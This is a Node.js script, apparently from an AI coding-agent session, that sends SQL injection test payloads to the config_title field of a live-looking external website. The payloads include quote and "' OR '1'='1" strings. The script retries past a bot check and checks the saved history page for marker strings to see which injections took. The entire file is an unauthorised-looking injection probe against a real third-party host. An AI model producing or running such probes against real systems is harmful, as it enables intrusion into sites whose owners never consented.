import { makeClient } from './lib.mjs';
import fs from 'fs';
const c = makeClient('https://tutorialinjectid.my.id');
const T = '/config/index.php?page=1';
const H = { 'content-type': 'application/x-www-form-urlencoded' };
const sleep = ms => new Promise(r => setTimeout(r, ms));
const URLV = 'https://sfile.co/VCa4EJPMs7J';
const cases = [
  ['A-control', 'SQLIA-OK'],
  ['B-quote', "SQLIB-'"],
  ['C-dblquote', "SQLIC-''"],
  ['D-backslash', 'SQLID-\\'],
  ['E-paren-or', "SQLIE-' OR '1'='1"],
];
await c.get(T);
const resp = {};
for (const [k, title] of cases) {
  const body = new URLSearchParams({ action: 'process_download', config_url: URLV, config_title: title }).toString();
  const t0 = Date.now();
  let r = await c.get(T, { method: 'POST', body, headers: H });
  if (/wsidchk/.test(r.body)) r = await c.get(T, { method: 'POST', body, headers: H });
  resp[k] = r.status + ' ' + r.body.replace(/\s+/g, ' ').slice(0, 130);
  console.log(`${k.padEnd(13)} ${Date.now() - t0}ms ${resp[k]}`);
  await sleep(1200);
}
const g = await c.get('/config/');
fs.writeFileSync('/tmp/opencode/config_sqli.html', g.body);
console.log('\n--- rows di history (urutan) ---');
const i = g.body.indexOf('id="historyList"');
const blk = g.body.slice(i, i + 9000);
const rows = [...blk.matchAll(/text-truncate w-100">([\s\S]{0,140}?)<\/span>/g)].map(m => m[1].replace(/\s+/g, ' '));
for (const r of rows.slice(0, 7)) console.log(' *', r);
console.log('\nmarker SQLIA:', /SQLIA/.test(blk) || /SQLIA-OK/.test(g.body), '| SQLIB:', /SQLIB/.test(g.body), '| SQLIC:', /SQLIC/.test(g.body), '| SQLID:', /SQLID/.test(g.body), '| SQLIE:', /SQLIE/.test(g.body));
